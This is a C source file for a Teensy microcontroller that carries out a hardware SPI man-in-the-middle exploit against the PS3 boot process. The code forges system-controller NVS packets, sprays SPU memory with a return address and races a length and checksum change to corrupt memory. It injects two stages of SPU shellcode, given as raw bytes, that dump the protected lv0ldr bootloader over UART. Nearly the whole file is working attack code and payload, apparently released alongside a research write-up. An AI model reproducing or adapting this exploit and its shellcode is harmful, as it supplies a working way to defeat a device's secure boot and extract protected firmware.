/**
 * Teensy SPI MITM - PS3 lv0ldr Edition
 * 
 * Copyright 2022, MikeM64
 */

/*
 * The writeup which shows how this exploit works is available here:
 *
 * https://github.com/MikeM64/Exploit-Writeups/blob/main/PS3/lv0ldr-spi-mitm/lv0ldr-spi-mitm.md
 */

#include <stdint.h>
#include <stdbool.h>

#include <SPI.h>

/*
 * Choose which PS3 you're running this against before compiling.
 */
//#define PS3_CECH_2500
//#define PS3_CECH_3000

/* Pin to tell the FPGA to enable/disable the interrupt lines from BE -> SC */
#define FPGA_INT_EN_PIN     2

/* Pin to tell the FPGA whether SC is the controller or the teensy is */
#define FPGA_SPI_CTRL_PIN   3

/* SPI Pins on Teensy 4.0 */
#define SPI_CS_PIN          10
#define SPI_COPI_PIN        11
#define SPI_CIPO_PIN        12
#define SPI_CLK_PIN         13

/*
 * Print all received SPI bytes to serial
 *
 * When using a logic analyzer to debug/decode:
 *  - CPOL = 1 for debugging messages sent by the teensy
 *  - CPOL = 0 for messages sent SC -> BE / BE -> SC
 */
//#define DEBUG_SPI_RX

/* SPI RX Buffer, used to read the SPI transfers from SC -> BE until
 * the matching one is found for exploitation. */
static uint8_t s_spi_rx_buffer[0x1000];
static size_t  s_spi_rx_index;

/* Matches message 133 from successful-boot-mitm-1.txt
 *
 * Header: 14 01 00 00 00 00 80 17 00 00 00 00 00 24 00 24
 * Body  : 00 00 00 20 01 FF 02 FF FF FF FF FF FF FF 00 FF
 *         FF FF FF FF FF 00 FF FE FF FF FF FF 00 00 00 01
 *         00 00 00 00
 *
 * struct sc_hdr
 * {
 *     uint8_t service_id;              // 0x14 - NVS Read
 *     uint8_t version;                 // Must be 1
 *     uint16_t transaction_id;         // Response from SC
 *     uint8_t  res[2];                 // Response from SC
 *     uint16_t cksum;                  // Checksum of first 6 header bytes
 *     uint32_t communication_tag;      // 0
 *     uint16_t body_size[2];           // Message body length, both must be the same
 * };
 *
 * struct nvs_request_header
 * {
 *      uint8_t operation;              // 0x20 read, 0x10 write
 *      uint8_t block_num;
 *      uint8_t offset;
 *      uint8_t length;
 * };
 *
 * struct nvs_response_header
 * {
 *      uint8_t status;                 // 0x00 == success
 *      uint8_t block_num;
 *      uint8_t offset;
 *      uint8_t length;
 * };
 */
static uint8_t s_syscon_heap_spray_msg_match_pattern[] = {0x31, 0xa0, 0x00, 0x14, 0x01};

/*
 * NVS read response used to get data into the SPU LS.
 * Modified to have a body length of 0x100 instead of the original 0x24.
 * Written to 0xA000
 */
static uint8_t s_nvs_heap_spray_hdr[] = {0x14, 0x01, 0x00, 0x02, 0x00, 0x00, 0x80, 0x17,
                                         0x00, 0x00, 0x00, 0x00, 0x01, 0x04, 0x01, 0x04};

/*
 * The original data returned from SC to the first NVS read. Keeping this as-is
 * to ensure execution continues as normal.
 * Written after the header to 0xA010
 */

#if defined(PS3_CECH_2500)
static uint8_t s_nvs_read_body[] = {0x0, 0x2, 0x0, 0x20};
#elif defined(PS3_CECH_3000)
static uint8_t s_nvs_read_body[] = {0x82, 0x01, 0x80, 0x01};
#else
#error Please select which PS3 model is being used
#endif


/*
 * Body checksum, written to the word immediately after the packet.
 * 0xA000 (Base) + 0x10 (Header) + 0x100 (Body) = 0xA110
 */
static uint8_t s_nvs_heap_spray_cksum[] = {0x00, 0x00, 0xb2, 0x64};

/*
 * Packet counter used to notify BE there's a packet waiting.
 * Written to 0xAFF0.
 */
static uint8_t s_nvs_heap_spray_pkt_ctr[] = {0x00, 0x02, 0x00, 0x02};

/*
 * There's one additional write with every SC -> BE message. Seems like a
 * doorbell of some kind at this point.
 * Written to 0x9104.
 */
static uint8_t s_extra_write[] = {0x00, 0x00, 0x00, 0x01};

/*
 * Matches message 152 from successful-boot-mitm-1.txt
 */
static uint8_t s_syscon_exploit_trigger_match_pattern[] = {0x31, 0xa0, 0x00, 0x12, 0x01};

static uint8_t s_syscon_exploit_trigger_hdr[] = {0x12, 0x01, 0x00, 0x03, 0x00, 0x00, 0x80, 0x16,
                                                 0x00, 0x00, 0x00, 0x00, 0x00, 0x0C, 0x00, 0x0C};
static uint8_t s_syscon_exploit_trigger_body[] = {0x03, 0x00, 0x00, 0x00, 0x17, 0xD7, 0x84, 0x00,
                                                  0x00, 0x00, 0x00, 0x00};
static uint8_t s_syscon_exploit_trigger_cksum[] = {0x00, 0x00, 0xfd, 0x37};
static uint8_t s_syscon_exploit_trigger_pkt_ctr[] = {0x00, 0x03, 0x00, 0x03};
static uint8_t s_exploit_large_len[] = {0x00, 0x54, 0x00, 0x54};
static uint8_t s_exploit_cksum[] = {0x00, 0x00, 0xfd, 0x00};

/*
 * Stage 1 Loader from Jestero:
 * 2c0:   43 f0 90 03     ila     $3,254240       # 3e120
 * 2c4:   21 a0 08 03     wrch    $ch16,$3
 * 2c8:   42 01 20 03     ila     $3,576  # 240
 * 2cc:   21 a0 08 83     wrch    $ch17,$3
 * 2d0:   42 46 09 03     ila     $3,35858        # 8c12
 * 2d4:   3f 01 01 83     rotqbii $3,$3,4
 * 2d8:   21 a0 09 03     wrch    $ch18,$3
 * 2dc:   42 00 80 03     ila     $3,256  # 100
 * 2e0:   21 a0 09 83     wrch    $ch19,$3
 * 2e4:   42 00 01 03     ila     $3,2
 * 2e8:   21 a0 0a 03     wrch    $ch20,$3 // TagID
 * 2ec:   42 00 20 03     ila     $3,64   # 40
 * 2f0:   21 a0 0a 83     wrch    $ch21,$3
 * 2f4:   40 80 01 03     il      $3,2
 * 2f8:   21 a0 0b 03     wrch    $ch22,$3 // TagMask
 *
 * 000002fc <wait>:
 * 2fc:   40 80 00 03     il      $3,0
 * 300:   21 a0 0b 83     wrch    $ch23,$3 // TagUpdate
 * 304:   01 a0 0c 03     rdch    $3,$ch24
 * 308:   20 7f fe 83     brz     $3,2fc <wait>   # 2fc
 *                       sync
 * 30c:   30 7c 24 00     bra     3e120 <_end+0x3d5b0>
 */
unsigned char stage1_shellcode[] = {                                                                 
    0x43, 0xf0, 0x90, 0x03, 0x21, 0xa0, 0x08, 0x03, 0x42, 0x01, 0x20, 0x03,
    0x21, 0xa0, 0x08, 0x83, 0x42, 0x46, 0x09, 0x03, 0x3f, 0x01, 0x01, 0x83,
    0x21, 0xa0, 0x09, 0x03, 0x42, 0x07, 0x70, 0x03, 0x21, 0xa0, 0x09, 0x83,
    0x42, 0x00, 0x01, 0x03, 0x21, 0xa0, 0x0a, 0x03, 0x42, 0x00, 0x20, 0x03,
    0x21, 0xa0, 0x0a, 0x83, 0x40, 0x80, 0x00, 0x03, 0x21, 0xa0, 0x0b, 0x83,
    0x01, 0xa0, 0x0c, 0x03, 0x20, 0x7f, 0xfe, 0x83, 0x00, 0x40, 0x00, 0x00,
    0x30, 0x7c, 0x24, 0x00
};                                                                                                    

/*
 * Stage 2 Dumper shellcode - This will dump lv0ldr out over SB UART.
 */
unsigned char stage2_shellcode[] = {
  0x42, 0x00, 0xd8, 0x03, 0x12, 0x00, 0x2b, 0x90, 0x43, 0xf0, 0x00, 0x02,
  0x24, 0xff, 0x40, 0xfe, 0x42, 0x00, 0x0c, 0x4b, 0x33, 0x00, 0x00, 0xfe,
  0x40, 0x20, 0x00, 0x7f, 0x24, 0xff, 0xc0, 0xd0, 0x40, 0x80, 0x00, 0x50,
  0x24, 0xff, 0x80, 0xd1, 0x41, 0x00, 0x02, 0x51, 0x24, 0x00, 0x40, 0x80,
  0x08, 0x1f, 0xa5, 0xfe, 0x24, 0xfe, 0xc0, 0x81, 0x1c, 0xec, 0x00, 0x81,
  0x23, 0x80, 0x32, 0x82, 0x18, 0x1f, 0x81, 0x83, 0x33, 0x00, 0x23, 0x80,
  0x1c, 0x03, 0x68, 0x04, 0x34, 0x00, 0x28, 0x05, 0x1c, 0x00, 0x68, 0x50,
  0x3b, 0x81, 0x02, 0x83, 0x33, 0x00, 0x04, 0x00, 0x78, 0x14, 0x68, 0x06,
  0x20, 0x7f, 0xfd, 0x06, 0x42, 0x00, 0xe0, 0x07, 0x18, 0x1f, 0x83, 0x83,
  0x33, 0x00, 0x1e, 0x80, 0x32, 0x00, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00,
  0x41, 0x00, 0x7f, 0x88, 0x33, 0x80, 0x2a, 0x85, 0x40, 0x80, 0x00, 0x04,
  0x24, 0xff, 0x40, 0x81, 0x40, 0x81, 0x20, 0x07, 0x1c, 0xf4, 0x00, 0x81,
  0x60, 0xf9, 0x84, 0x08, 0x40, 0x80, 0x02, 0x09, 0x1c, 0x02, 0x02, 0x8b,
  0x04, 0x00, 0x02, 0x0c, 0x04, 0x00, 0x05, 0x8e, 0x40, 0x80, 0x20, 0x0a,
  0x40, 0x80, 0x00, 0x86, 0x40, 0x80, 0x04, 0x0d, 0x12, 0x00, 0x03, 0x8a,
  0x21, 0xa0, 0x08, 0x0e, 0x21, 0xa0, 0x08, 0x87, 0x21, 0xa0, 0x09, 0x08,
  0x21, 0xa0, 0x09, 0x89, 0x21, 0xa0, 0x0a, 0x0c, 0x21, 0xa0, 0x0a, 0x8a,
  0x21, 0xa0, 0x0b, 0x06, 0x21, 0xa0, 0x0b, 0x8c, 0x01, 0xa0, 0x0c, 0x02,
  0x20, 0x7f, 0xfe, 0x82, 0x38, 0x83, 0x42, 0x8f, 0x3b, 0x82, 0xc7, 0x90,
  0x14, 0x40, 0x08, 0x11, 0x40, 0x20, 0x00, 0x7f, 0x20, 0x7f, 0xf8, 0x91,
  0x40, 0x80, 0x06, 0x13, 0x12, 0x00, 0x0a, 0x98, 0x14, 0x3f, 0xc1, 0x83,
  0x33, 0x80, 0x1a, 0x92, 0x1c, 0x03, 0x09, 0x17, 0x38, 0x84, 0xc9, 0x14,
  0x3e, 0xc3, 0x09, 0x15, 0xb2, 0xc5, 0x01, 0x95, 0x28, 0x84, 0xc9, 0x16,
  0x21, 0xa0, 0x08, 0x17, 0x40, 0x81, 0x20, 0x18, 0x21, 0xa0, 0x08, 0x98,
  0x41, 0x00, 0x7f, 0x99, 0x60, 0xf9, 0x8e, 0x19, 0x21, 0xa0, 0x09, 0x19,
  0x40, 0x80, 0x02, 0x1a, 0x21, 0xa0, 0x09, 0x9a, 0x21, 0xa0, 0x0a, 0x04,
  0x40, 0x80, 0x10, 0x1b, 0x21, 0xa0, 0x0a, 0x9b, 0x40, 0x80, 0x00, 0x9c,
  0x40, 0x80, 0x00, 0x1d, 0x21, 0xa0, 0x0b, 0x1c, 0x21, 0xa0, 0x0b, 0x9d,
  0x01, 0xa0, 0x0c, 0x1e, 0x20, 0x7f, 0xfe, 0x9e, 0x1c, 0x0c, 0x00, 0x81,
  0x35, 0x00, 0x00, 0x00, 0x12, 0x00, 0x08, 0x0b, 0x24, 0xff, 0xc0, 0xd0,
  0x04, 0x00, 0x01, 0xd0, 0x24, 0x00, 0x40, 0x80, 0x24, 0xff, 0x00, 0x81,
  0x1c, 0xf0, 0x00, 0x81, 0x1c, 0x03, 0x68, 0x02, 0x34, 0x00, 0x28, 0x03,
  0x3b, 0x80, 0x81, 0x83, 0x56, 0xc0, 0x01, 0x84, 0x40, 0x20, 0x00, 0x7f,
  0x23, 0x00, 0x02, 0x84, 0x1c, 0x10, 0x00, 0x81, 0x34, 0x00, 0x40, 0x80,
  0x34, 0xff, 0xc0, 0xd0, 0x35, 0x00, 0x00, 0x00, 0x1c, 0x00, 0x68, 0x50,
  0x33, 0x7f, 0xda, 0x80, 0x32, 0x7f, 0xfa, 0x00, 0x00, 0x20, 0x00, 0x00,
  0x53, 0x74, 0x61, 0x72, 0x74, 0x69, 0x6e, 0x67, 0x20, 0x64, 0x75, 0x6d,
  0x70, 0x3a, 0x0a, 0x00, 0x0a, 0x43, 0x6f, 0x6d, 0x70, 0x6c, 0x65, 0x74,
  0x65, 0x21, 0x0a, 0x00, 0x00, 0x00, 0x00, 0x00
};

/* The current pattern being matched by the SPI RX interrupt */
static uint8_t *s_current_match_pattern = s_syscon_heap_spray_msg_match_pattern;

/* The position within s_current_match_pattern */
static size_t  s_syscon_match_index;

/* Found the matching pattern */
static bool    s_match_found = false;

/* Number of packets matched */
static uint32_t s_packet_matched = 0;

/*
 * Around 35 MHz is where the current HW setup starts to break down and see
 * corruption in SPI transfers where the PS3 doesn't boot. 25MHz seems to
 * be stable enough. No delays are required between any transfers as well.
 *
 * This exploit requires use of both SPI Controller and Peripheral modes in order
 * to detect the right messages to modify as well as to inject them. The SPISlave_T4
 * library worked well to detect messages, and then using the default SPI library
 * worked to inject one message. Switching back to SPISlave for peripheral mode
 * hung the teensy when setting the RX Interrupt bit. I'm speculating that
 * using both libraries at the same time causes issues with resource contention/
 * configuration so I've written a minimal SPI interface that can
 * switch between controller and peripheral modes multiple times.
 *
 * With the arduino library, SPI_MODE2 is used (CPOL = 1, CPHA = 0)
 * LPSPI4 is the default SPI for Teensy:
 *  - Memory 0x403a0000 - 0x403a3fff (p. 40)
 *  - XBAR1_OUT118 - LPSPI4_TRG_INPUT (p. 72)
 *  - CM7 domain IRQ 35 (p. 45)
 *
 * Clock layout:
 * MUX of: (via CCM_CBCMR[LPSPI_CLK_SEL] - pg. 1050 - default is PLL2)
 *  - PFD1 664.64 MHz
 *  - PFD0 720 MHz
 *  - PLL2 528 MHz
 *  - PFD2 396 MHz
 * Into:
 *  (cg - LPCG Gating Option) - CBCMR[LPSPI_PODF][default /4][3-bit divider] - LPSPI_CLK_ROOT
 * 3-bit divider has range of dividing by 1-8 --> Defaults to 132MHz???
 *
 * Clock gating via: lpspi4_ipg_clk -> ipg_clk_root - CCGR1[CG3]
 * Default @ power on is 6 MHz, maximum is 132 MHz full power, 24 MHz low power mode
 *
 * -> TCR[PRESCALE] - Default is /1
 * -> CCR[SCKDIV] - Default is 2 cycles of LPSPI clk as period
 * SPI.cpp - line 1322
 *
 * Pin Mapping (Default on bootup):
 * 10 - LPSPI4_PCS0 - GPIO_B0_00 - ALT3 - IOMUXC_SW_MUX_CTL_PAD_GPIO_B0_00 = 0x3
 * 11 - LPSPI4_SOUT - GPIO_B0_02 - ALT3 - IOMUXC_SW_MUX_CTL_PAD_GPIO_B0_02 = 0x3
 * 12 - LPSPI4_SIN  - GPIO_B0_01 - ALT3 - IOMUXC_SW_MUX_CTL_PAD_GPIO_B0_01 = 0x3
 * 13 - LPSPI4_SCK  - GPIO_B0_03 - ALT3 - IOMUXC_SW_MUX_CTL_PAD_GPIO_B0_03 = 0x3
 *
 * Pad settings to set:
 * IOMUXC_SW_PAD_CTL_PAD_GPIO_B0_00 -> Speed (0) - 50MHz, DSE(6) - R0/6
 * IOMUXC_SW_PAD_CTL_PAD_GPIO_B0_02 -> Speed (0) - 50MHz, DSE(6) - R0/6
 * IOMUXC_SW_PAD_CTL_PAD_GPIO_B0_01 -> Speed (0) - 50MHz, DSE(6) - R0/6
 * IOMUXC_SW_PAD_CTL_PAD_GPIO_B0_03 -> Speed (0) - 50MHz, DSE(6) - R0/6
 */

SPISettings s_controller_settings = SPISettings(25000000, MSBFIRST, SPI_MODE2);

void
spi_peripheral_rx_cb (void)
{
    /* Adapted from SPISlave_T4_OPT::SLAVE_ISR */
    while ( !(LPSPI4_SR & LPSPI_SR_FCF) ) { /* FCF: Frame Complete Flag, set when PCS deasserts */
        if ( LPSPI4_SR & LPSPI_SR_TEF ) { /* transmit error, clear flag, check cabling */
            LPSPI4_SR = LPSPI_SR_TEF;
        }

        if ( LPSPI4_SR & LPSPI_SR_REF ) {
            Serial.print("!");
            LPSPI4_SR = LPSPI_SR_REF;
        }

        if (LPSPI4_SR & LPSPI_SR_WCF) { /* WCF set */
            s_spi_rx_buffer[s_spi_rx_index] = (uint8_t)LPSPI4_RDR;
#ifdef DEBUG_SPI_RX
            Serial.print("RX: ");
            Serial.print(s_spi_rx_buffer[s_spi_rx_index], HEX);
            Serial.print(" MATCH: ");
            Serial.print(s_current_match_pattern[s_syscon_match_index], HEX);
            Serial.print(" FOUND: ");
            Serial.print(s_match_found);
            Serial.print(" IDX: ");
            Serial.print(s_syscon_match_index);
            Serial.print('\n');
#endif

            if (!s_match_found &&
                s_spi_rx_buffer[s_spi_rx_index] ==
                s_current_match_pattern[s_syscon_match_index]) {
                /* 5 is the fixed length of s_current_match_pattern */
                if (s_syscon_match_index < (5 - 1)) {
                    s_syscon_match_index++;
                } else {
                    s_match_found = true;
                }
            } else if (s_match_found) {
                /*
                 * Don't do anything on a match. It's possible that a match will be triggered
                 * and a number of additional transfers will occur before the teensy can
                 * disable the syscon SPI and interrupt lines.
                 */
            } else {
                s_syscon_match_index = 0;
                s_match_found = false;
            }

            LPSPI4_TDR = s_spi_rx_buffer[s_spi_rx_index];
            if (s_spi_rx_index == sizeof(s_spi_rx_buffer) - 1) {
                s_spi_rx_index = 0;
            } else {
                s_spi_rx_index += 1;
            }
            LPSPI4_SR = LPSPI_SR_WCF; /* Clear WCF */
        }
    }

    if (s_match_found) {
        disable_syscon_spi();
        NVIC_DISABLE_IRQ(IRQ_LPSPI4);
        NVIC_CLEAR_PENDING(IRQ_LPSPI4);
    }

#ifdef DEBUG_SPI_RX
    Serial.print('\n');
    Serial.flush();
#endif

    /* Reset after interrupt completion */
    LPSPI4_SR = 0x3F00;
    asm volatile ("dsb");
}

void
setup_spi_peripheral_mode (void)
{
    s_spi_rx_index = 0;

    /* Disable the module while changing settings */
    LPSPI4_CR = LPSPI_CR_RST;
    LPSPI4_CR = 0;

    /* Enable peripheral mode and swap COPI/CIPO pins */
    LPSPI4_CFGR0 = 0;
    LPSPI4_CFGR1 = 0;
    LPSPI4_CFGR1 = (LPSPI_CFGR1_PINCFG(3));

    /* No watermarks for transfers */
    LPSPI4_FCR = 0;

    /* Enable interrupts */
    LPSPI4_IER = LPSPI_IER_RDIE;
    LPSPI4_DER = 0;

    /* Clear FIFOs */
    LPSPI4_CR = LPSPI_CR_RRF | LPSPI_CR_RTF;

    /*
     * PS3 peripheral uses:
     *  - SPI Mode 2 - CPOL = 1, CPHA = 0 --> Only needed to be set when in controller mode
     *  - 8-bit transfers
     */
    LPSPI4_TCR = (LPSPI_TCR_FRAMESZ(7));

    /* Enable the module */
    LPSPI4_CR |= LPSPI_CR_MEN;

    /* Reset status register - write 1 to clear */
    LPSPI4_SR = 0x3F00;

    /* Initialize transmit to known data */
    LPSPI4_TDR = 0x0;

    attachInterruptVector(IRQ_LPSPI4, spi_peripheral_rx_cb);
    NVIC_CLEAR_PENDING(IRQ_LPSPI4);
    NVIC_SET_PRIORITY(IRQ_LPSPI4, 1);
    NVIC_ENABLE_IRQ(IRQ_LPSPI4);

    Serial.println("SPI Peripheral enabled");
    Serial.flush();
}

void
setup_spi_controller_mode (void)
{
    /* Reset the module for use as a controller again. */
    LPSPI4_CR = LPSPI_CR_RST;
    LPSPI4_CR = 0;

    LPSPI4_CFGR0 = 0;
    LPSPI4_CFGR1 = 0;
    /* Controller mode + don't swap COPI/CIPO */
    LPSPI4_CFGR1 = (LPSPI_CFGR1_PINCFG(0) | LPSPI_CFGR1_MASTER | LPSPI_CFGR1_SAMPLE);

    /* Track usage of TX FIFO */
    LPSPI4_FCR = LPSPI_FCR_TXWATER(15);

    /* No interrupts or DMA needed for controller mode */
    LPSPI4_IER = 0;
    LPSPI4_DER = 0;

    /* Clear FIFOs */
    LPSPI4_CR = LPSPI_CR_RRF | LPSPI_CR_RTF;

    /* Setup TCR for PS3 - 8-bit transfer + Mode 2 (CPOL) */
    LPSPI4_TCR = (LPSPI_TCR_CPOL | LPSPI_TCR_FRAMESZ(7));

    /* Clock will be set once we use the original SPI library */

    /* Enable the module */
    LPSPI4_CR |= LPSPI_CR_MEN;

    /* Reset the status register to a known default */
    LPSPI4_SR = 0x3F00;

    pinMode(SPI_CS_PIN, OUTPUT);
    SPI.begin();

    Serial.println("SPI Controller enabled");
    Serial.flush();
}

void
pin_setup (void)
{
    pinMode(FPGA_INT_EN_PIN, OUTPUT);
    pinMode(FPGA_SPI_CTRL_PIN, OUTPUT);
}

void
spi_setup (void)
{
    /* R0/7, 200 MHz max output speed */
    uint32_t spi_io = IOMUXC_PAD_DSE(7) | IOMUXC_PAD_SPEED(2);

    /* Setup the SPI PIN mappings */
    IOMUXC_LPSPI4_PCS0_SELECT_INPUT = 0x0;
    IOMUXC_LPSPI4_SCK_SELECT_INPUT = 0x0;
    IOMUXC_LPSPI4_SDI_SELECT_INPUT = 0x0;
    IOMUXC_LPSPI4_SDO_SELECT_INPUT = 0x0;

    /* ALT3 aligns with Teensy SPI pinout */
    IOMUXC_SW_MUX_CTL_PAD_GPIO_B0_00 = 0x3;
    IOMUXC_SW_MUX_CTL_PAD_GPIO_B0_01 = 0x3;
    IOMUXC_SW_MUX_CTL_PAD_GPIO_B0_02 = 0x3;
    IOMUXC_SW_MUX_CTL_PAD_GPIO_B0_03 = 0x3;

    /* Setup PAD driving settings */
    IOMUXC_SW_PAD_CTL_PAD_GPIO_B0_00 = spi_io;
    IOMUXC_SW_PAD_CTL_PAD_GPIO_B0_01 = spi_io;
    IOMUXC_SW_PAD_CTL_PAD_GPIO_B0_02 = spi_io;
    IOMUXC_SW_PAD_CTL_PAD_GPIO_B0_03 = spi_io;

    /* Enable the clock gate for LPSPI4 */
    CCM_CCGR1 |= CCM_CCGR1_LPSPI4(3);
}

inline void
enable_int_lines (void)
{
    digitalWrite(FPGA_INT_EN_PIN, LOW);
}

inline void
disable_int_lines (void)
{
    digitalWrite(FPGA_INT_EN_PIN, HIGH);
}

inline void
disable_syscon_spi (void)
{
    digitalWrite(FPGA_SPI_CTRL_PIN, HIGH);
}

inline void
enable_syscon_spi (void)
{
    digitalWrite(FPGA_SPI_CTRL_PIN, LOW);
}

void
reset_for_continue (void)
{
    s_match_found = false;
    s_spi_rx_index = 0;
    s_syscon_match_index = 0;
}

void
setup(void) {
    reset_for_continue();

    Serial.begin(115200);
    Serial.flush();

    pin_setup();
    spi_setup();
    enable_int_lines();
    enable_syscon_spi();
    setup_spi_peripheral_mode();

    Serial.println("Setup complete");
}

void
write_spi_data (uint16_t addr, uint8_t *data, size_t len)
{
    size_t i;

    SPI.beginTransaction(s_controller_settings);

    digitalWrite(SPI_CS_PIN, LOW);

    /* 0x31 == SPI write to BE0 */
    (void)SPI.transfer(0x31);

    /* Address next */
    (void)SPI.transfer((uint8_t)(addr >> 8));
    (void)SPI.transfer((uint8_t)(addr & 0xff));

    /* Finally data */
    for (i = 0; i < len; i++) {
        (void)SPI.transfer(*data++);
    }

    digitalWrite(SPI_CS_PIN, HIGH);
    SPI.endTransaction();
}

void
wait_for_c_key (void)
{
    char c;

    Serial.println("Press 'c' to continue");
    do {
        while(!Serial.available()) {}
        c = Serial.read();
    } while(c != 'c');
}

void
reset_teensy (void)
{
    Serial.println("Resetting...");
    Serial.flush();
    SCB_AIRCR = 0x05FA0004;
}

void
write_heap_spray (void)
{
    int i;
    uint8_t ls_spray_address[] = {0x00, 0x03, 0xe0, 0x70};

    /*
     * Spray BE SPI MMIO space with the return address of the code to run. Select
     * parts will be overwritten with the valid (but modified) packet to get data
     * into the SPU LS. 0x3e000 is the scratchpad where data is copied into the shared LS.
     * Start executing code from 0x3e070 for the stage 1 loader
     */
    for (i = 0; i < 0x500; i += 4) {
        write_spi_data(0xA000 + i, ls_spray_address, sizeof(ls_spray_address));
    }

    write_spi_data(0xA000, s_nvs_heap_spray_hdr, sizeof(s_nvs_heap_spray_hdr));
    write_spi_data(0xA010, s_nvs_read_body, sizeof(s_nvs_read_body));
    write_spi_data(0xA114, s_nvs_heap_spray_cksum, sizeof(s_nvs_heap_spray_cksum));
    write_spi_data(0xAFF0, s_nvs_heap_spray_pkt_ctr, sizeof(s_nvs_heap_spray_pkt_ctr));

    /*
     * From the linux bootldr testbench, the stage 1 shellcode is to be loaded to 0x3e070. This in
     * turn reads in the exploit code to 0x3e120 and branches to it
     */
    write_spi_data(0xA070, stage1_shellcode, sizeof(stage1_shellcode));
    write_spi_data(0x9104, s_extra_write, sizeof(s_extra_write));

    Serial.println("Finished writing stack return addresses");
    Serial.flush();
}

void
trigger_exploit (void)
{
    size_t i;

    Serial.println("Triggering exploit");

    write_spi_data(0xA000, s_syscon_exploit_trigger_hdr, sizeof(s_syscon_exploit_trigger_hdr));
    write_spi_data(0xA010, s_syscon_exploit_trigger_body, sizeof(s_syscon_exploit_trigger_body));
    write_spi_data(0xA010 + sizeof(s_syscon_exploit_trigger_body), s_syscon_exploit_trigger_cksum,
                   sizeof(s_syscon_exploit_trigger_cksum));
    write_spi_data(0xAFF0, s_syscon_exploit_trigger_pkt_ctr, sizeof(s_syscon_exploit_trigger_pkt_ctr));

    /* Write the stage 2 information at this time to MMIO space. Stage 1 (from the first packet) will
     * copy new data into the shared LS at 0x3e120 */
    write_spi_data(0xA120, stage2_shellcode, sizeof(stage2_shellcode));
    write_spi_data(0x9104, s_extra_write, sizeof(s_extra_write));

    /* Wait a good amount of time to race the second header read. */
    for (i = 0; i < 125; i++) {
        asm("nop");
    }

    /*
     * The checksum needs to be corrected for the new length (not new body)
     */
    write_spi_data(0xA00C, s_exploit_large_len, sizeof(s_exploit_large_len));
    write_spi_data(0xA010 + sizeof(s_syscon_exploit_trigger_body),
                   s_exploit_cksum, sizeof(s_exploit_cksum));

    Serial.println("Exploit complete!");
}

void
loop(void) {
    enable_int_lines();
    enable_syscon_spi();

    if (s_match_found) {
        /*
         * - Lock out the interrupt lines to prevent syscon from starting
         *   new message transactions between SC/BE
         */
        disable_int_lines();

        /*
         * - Lock out the SPI lines before the TX packet counter write to
         *   make the teensy the new controller
         *      - 1.24ms window, by the 3rd de-assertion of #CE after detection
         */
        disable_syscon_spi();
        Serial.println("Disabled INT and SPI");
        Serial.flush();

        /*
         * Switch back to the normal SPI library now that controller mode
         * is needed.
         */
        setup_spi_controller_mode();

        /*
         * Wait some time before continuing to flush out the SPI HW. There's no rush
         * yet as syscon never got the chance to write the packet counter.
         *
         * Experimentation has shown that the bootup of the PS3 can be indefinitely delayed
         * by intercepting the interrupt lines and allowing interrupt requests
         * through one at a time.
         */
        digitalWrite(SPI_CS_PIN, HIGH);
        delayMicroseconds(5000);

        if (s_packet_matched == 0) {
            /* The first match is used to get data into the SPU LS */
            write_heap_spray();
            s_match_found = false;
            s_current_match_pattern = s_syscon_exploit_trigger_match_pattern;
        } else if (s_packet_matched == 1) {
            /* The second match triggers the exploit */
            trigger_exploit();
            s_match_found = false;
        }

        SPI.end();
        s_packet_matched++;
        Serial.println("Back to peripheral");
        Serial.flush();
        spi_setup();
        setup_spi_peripheral_mode();

        Serial.println("Done writing packet - Enabling Syscon SPI");
        Serial.flush();
        enable_syscon_spi();
        enable_int_lines();

        if (s_packet_matched > 1) {
            Serial.println("Continue to reset teensy");
            wait_for_c_key();
            reset_teensy();
            while (1) {}
        }
    }
}
